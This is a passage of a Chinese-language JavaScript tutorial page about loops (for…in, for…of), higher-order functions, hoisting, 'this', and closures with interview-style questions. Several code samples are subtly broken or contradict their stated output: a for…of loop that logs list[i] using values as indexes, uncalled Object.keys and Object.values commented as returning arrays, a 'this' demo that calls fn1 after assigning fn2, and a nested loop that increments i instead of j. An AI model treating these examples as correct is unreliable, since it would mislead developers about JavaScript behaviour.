class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> str) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, str[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 a</span></span><br><span class="line"><span class="comment">// 1 b</span></span><br><span class="line"><span class="comment">// 2 c</span></span><br><span class="line"><span class="comment">// 3 d</span></span><br><span class="line"><span class="comment">// 4 e</span></span><br></pre></td></tr></table></figure></li><li><p>遍历map</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">200</span>,</span><br><span class="line">  c: <span class="number">300</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> map) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, map[key]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a 100</span></span><br><span class="line"><span class="comment">// b 200</span></span><br><span class="line"><span class="comment">// c 300</span></span><br></pre></td></tr></table></figure></li><li><p>遍历list map</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> listMap = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小红'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    name: <span class="string">'小白'</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> listMap) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, listMap[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 &#123;id: 1, name: "小明"&#125;</span></span><br><span class="line"><span class="comment">// 1 &#123;id: 2, name: "小红"&#125;</span></span><br><span class="line"><span class="comment">// 2 &#123;id: 3, name: "小白"&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="es6-for…of"><a href="#es6-for…of" class="headerlink" title="es6 for…of"></a>es6 for…of</h3><p>  for…of 语句不能对象使用<br>  for…of 语句取到的是list、string的值或map的value，类似于forEach语句</p><ol><li><p>遍历list</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> list) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, list[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 20</span></span><br><span class="line"><span class="comment">// 30</span></span><br><span class="line"><span class="comment">// 40</span></span><br><span class="line"><span class="comment">// 50</span></span><br></pre></td></tr></table></figure></li><li><p>遍历string</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> str) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"><span class="comment">// c</span></span><br><span class="line"><span class="comment">// d</span></span><br><span class="line"><span class="comment">// e</span></span><br></pre></td></tr></table></figure></li><li><p>如何让for…of支持map</p><ul><li><p>es6 遍历器map set 方法<br>详见<a href="http://es6.ruanyifeng.com/#docs/iterator" target="_blank" rel="noopener">阮一峰 Iterator遍历器</a></p></li><li><p>转换数组法<br>虽然 for…of 语句不能直接作用在 map 上，但是我们可以使用某些方法将 map 转成数组后再处理，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">200</span>,</span><br><span class="line">  c: <span class="number">300</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.values); <span class="comment">// [100, 200, 300]</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>高阶函数是指至少满足下列条件之一的函数：</p><ol><li>函数可以作为参数被传递</li><li>函数可以作为返回值输出</li></ol><p>常见的高阶函数：<code>map</code>、<code>filter</code>、<code>reduce</code>、<code>sort</code>、<code>forEach</code>、<code>some</code>、<code>every</code></p><hr><h2 id="作用域与闭包"><a href="#作用域与闭包" class="headerlink" title="作用域与闭包"></a>作用域与闭包</h2><h3 id="执行上下文"><a href="#执行上下文" class="headerlink" title="执行上下文"></a>执行上下文</h3><ol><li>范围：一段 <code>&lt;script&gt;</code> 或 一个函数</li><li>全局：变量定义、函数声明</li><li>函数：变量定义、函数声明、<code>this</code>、<code>arguments</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 后面的 var a 实际上会在此处先生成一段 var a = undefined;</span></span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn(<span class="string">'zhangsan'</span>); <span class="comment">// zhangsan 18</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 后面的 var age 实际上会提前执行，先在此处生成一段 var age = undefined;</span></span><br><span class="line">  age = <span class="number">18</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(name, age);</span><br><span class="line">  <span class="keyword">var</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>变量、函数声明默认会提前（变量提升），函数表示式不会提前。在函数内部的变量、函数同样也会提前。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fn1(); <span class="comment">// 此处调用，可以正常执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">fn1(); <span class="comment">// 此处调用，也可以正常执行。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn2(); <span class="comment">// 放在前面执行会报错</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">fn2(); <span class="comment">// 对于函数表达式，应该放在后面执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fn2() 放在前面执行的流程如下：</span></span><br><span class="line"><span class="comment">// 在顶部会生成一个 var fn2 = undefined;</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="literal">undefined</span>;</span><br><span class="line">fn2(); <span class="comment">// 执行相当于执行undefined，所以会报错</span></span><br><span class="line">fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p><code>this</code> 要在执行时才能确认制，定义时无法确认值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  name: <span class="string">'A'</span>,</span><br><span class="line">  fn: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.fn(); <span class="comment">// this === a</span></span><br><span class="line">a.fn.call(&#123;<span class="attr">name</span>: <span class="string">'B'</span>&#125;); <span class="comment">// this === &#123;name: 'B'&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn2 = a.fn;</span><br><span class="line">fn1(); <span class="comment">// this === window</span></span><br></pre></td></tr></table></figure></p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><ol><li><p>函数作为返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回一个函数，函数作为返回值</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// a是自由变量，父作用域（申明时的作用域，而不是执行时的作用域）的查找</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = F1();</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">f1(); <span class="comment">// 100</span></span><br></pre></td></tr></table></figure></li><li><p>函数作为参数传递</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回一个函数，函数作为返回值</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// a是自由变量，父作用域的查找</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = F1();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F2</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">  fn(); <span class="comment">// 100;</span></span><br><span class="line">&#125;</span><br><span class="line">F2(f1); <span class="comment">// 将 f1 作为参数传给 F2</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="面试题：变量提升"><a href="#面试题：变量提升" class="headerlink" title="面试题：变量提升"></a>面试题：变量提升</h3><p>定义变量、函数时，会默认提到当前作用域的最前面</p><h3 id="面试题：this的作用"><a href="#面试题：this的作用" class="headerlink" title="面试题：this的作用"></a>面试题：this的作用</h3><ol><li>作为构造函数执行</li><li>作为对象属性执行</li><li>作为普通函数执行</li><li>call apply bind</li></ol><h3 id="面试题：创建10个a标签，点击的时候弹出序号"><a href="#面试题：创建10个a标签，点击的时候弹出序号" class="headerlink" title="面试题：创建10个a标签，点击的时候弹出序号"></a>面试题：创建10个a标签，点击的时候弹出序号</h3><p>常规的思路（<strong>错误</strong>）：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i, a;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.innerHTML = i + <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">  a.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    alert(i);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>解析：绑定的事件是在后续的时候执行的，因为 i 是一个自由变量，依托的是全局作用域，此时 i 早已变成 10了，所以无论点击哪一个弹出来的都是10</p><p><strong>正确</strong>写法（使用自执行函数）：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">    a.innerHTML = i + <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    a.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">      alert(i);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>解析：使用一个自执行函数，将 i 从全局作用域变成了函数作用域，达到输出当前 i 的目的。</p><h3 id="面试题：如何理解作用域"><a href="#面试题：如何理解作用域" class="headerlink" title="面试题：如何理解作用域"></a>面试题：如何理解作用域</h3><ol><li>自由变量（函数内的变量是函数作用域，函数外的变量是全局作用域）</li><li>作用域链，即自由变量如何查找</li><li>闭包的2个使用场景</li></ol><h3 id="面试题：实际开发中闭包的使用"><a href="#面试题：实际开发中闭包的使用" class="headerlink" title="面试题：实际开发中闭包的使用"></a>面试题：实际开发中闭包的使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 闭包在实际应用中主要用于封装变量、收敛权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isFirstLoad</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _list = []; <span class="comment">// 变量_list被封装了，在外部无法获取到该变量</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">id</span>) </span>&#123; <span class="comment">// 使用函数将id的作用域变成函数作用域</span></span><br><span class="line">    <span class="keyword">if</span> (_list.indexOf(id) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _list.push(id);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> firstLoad = isFirstLoad();</span><br><span class="line">firstLoad(<span class="number">10</span>); <span class="comment">// true;</span></span><br><span class="line">firstLoad(<span class="number">10</span>); <span class="comment">// false</span></span><br><span class="line">firstLoad(<span class="number">20</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><hr><h2 id="闭包-1"><a href="#闭包-1" class="headerlink" title="闭包"></a>闭包</h2><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>简单的说，Javascript允许使用内部函数（即函数定义和函数表达式位于另一个函数的函数体内）访问它们所在的外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><ul><li><p>Demo1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func(<span class="number">1</span>)(<span class="number">2</span>) = <span class="number">3</span></span><br><span class="line">func(<span class="number">3</span>)(<span class="number">5</span>) = <span class="number">8</span></span><br><span class="line">由上例推导函数主体</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">num1</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">num2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Demo2</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置移动端基准字号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeSizer</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.style.fontSize = size + <span class="string">'px'</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> size12 = makeSizer(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> size14 = makeSizer(<span class="number">14</span>);</span><br><span class="line"><span class="keyword">var</span> size16 = makeSizer(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如设置按钮点击时调用</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'size-12'</span>).onclick = size12;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'size-14'</span>).onclick = size14;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'size-16'</span>).onclick = size16;</span><br></pre></td></tr></table></figure></li></ul><h3 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h3><ul><li><p>匿名自执行函数<br>我们知道所有的变量，如果不加上var关键字，则默认的会添加到全局对象的属性上去，这样的临时变量加入全局对象有很多坏处，<br>比如：别的函数可能误用这些变量；造成全局对象过于庞大，影响访问速度(因为变量的取值是需要从原型链上遍历的)。<br>除了每次使用变量都是用var关键字外，我们在实际情况下经常遇到这样一种情况，即有的函数只需要执行一次，其内部变量无需维护，<br>比如UI的初始化，那么我们可以使用闭包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data= &#123;    </span><br><span class="line">  table : [],    </span><br><span class="line">  tree : &#123;&#125;    </span><br><span class="line">&#125;;    </span><br><span class="line">     </span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">dm</span>)</span>&#123;    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; dm.table.rows; i++)&#123;    </span><br><span class="line">    <span class="keyword">var</span> row = dm.table.rows[i];    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; row.cells; i++)&#123;    </span><br><span class="line">       drawCell(i, j);    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;    </span><br><span class="line">&#125;)(data);</span><br></pre></td></tr></table></figure><p>我们创建了一个匿名的函数，并立即执行它，由于外部无法引用它内部的变量，因此在函数执行完后会立刻释放资源，关键是不污染全局对象。</p></li><li><p>结果缓存<br>我们开发中会碰到很多情况，设想我们有一个处理过程很耗时的函数对象，每次调用都会花费很长时间，<br>那么我们就需要将计算出来的值存储起来，当调用这个函数的时候，首先在缓存中查找，如果找不到，则进行计算，然后更新缓存并返回值，如果找到了，直接返回查找到的值即可。闭包正是可以做到这一点，因为它不会释放外部的引用，从而函数内部的值可以得以保留。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CachedSearchBox = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">  <span class="keyword">var</span> cache = &#123;&#125;,    </span><br><span class="line">      count = [];    </span><br><span class="line">  <span class="keyword">return</span> &#123;    </span><br><span class="line">    attachSearchBox: <span class="function"><span class="keyword">function</span>(<span class="params">dsid</span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span>(dsid <span class="keyword">in</span> cache)&#123;<span class="comment">//如果结果在缓存中    </span></span><br><span class="line">        <span class="keyword">return</span> cache[dsid];<span class="comment">//直接返回缓存中的对象    </span></span><br><span class="line">      &#125;    </span><br><span class="line">      <span class="keyword">var</span> fsb = <span class="keyword">new</span> uikit.webctrl.SearchBox(dsid);<span class="comment">//新建    </span></span><br><span class="line">      cache[dsid] = fsb;<span class="comment">//更新缓存    </span></span><br><span class="line">      <span class="keyword">if</span>(count.length &gt; <span class="number">100</span>)&#123;<span class="comment">//保正缓存的大小&lt;=100    </span></span><br><span class="line">        <span class="keyword">delete</span> cache[count.shift()];    </span><br><span class="line">      &#125;    </span><br><span class="line">      <span class="keyword">return</span> fsb;          </span><br><span class="line">    &#125;,</span><br><span class="line"> </span><br><span class="line">    clearSearchBox: <span class="function"><span class="keyword">function</span>(<span class="params">dsid</span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span>(dsid <span class="keyword">in</span> cache)&#123;    </span><br><span class="line">        cache[dsid].clearSelection();      </span><br><span class="line">      &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;;    </span><br><span class="line">&#125;)();    </span><br><span class="line">     </span><br><span class="line">CachedSearchBox.attachSearchBox(<span class="string">"input"</span>);</span><br></pre></td></tr></table></figure><p>这样我们在第二次调用的时候，就会从缓存中读取到该对象。</p></li><li><p>封装代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">  <span class="comment">//变量作用域为函数内部，外部无法访问    </span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"default"</span>;       </span><br><span class="line">     </span><br><span class="line">  <span class="keyword">return</span> &#123;    </span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">return</span> name;    </span><br><span class="line">    &#125;,    </span><br><span class="line">    setName: <span class="function"><span class="keyword">function</span>(<span class="params">newName</span>) </span>&#123;    </span><br><span class="line">      name = newName;    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;    </span><br><span class="line">&#125;();    </span><br><span class="line">     </span><br><span class="line">print(person.name);<span class="comment">//直接访问，结果为undefined    </span></span><br><span class="line">print(person.getName());    </span><br><span class="line">person.setName(<span class="string">"abruzzi"</span>);    </span><br><span class="line">print(person.getName());    </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">得到结果如下：   </span><br><span class="line"><span class="comment">// undefined  </span></span><br><span class="line"><span class="comment">// default  </span></span><br><span class="line"><span class="comment">// abruzzi</span></span><br></pre></td></tr></table></figure></li><li><p>实现类和继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 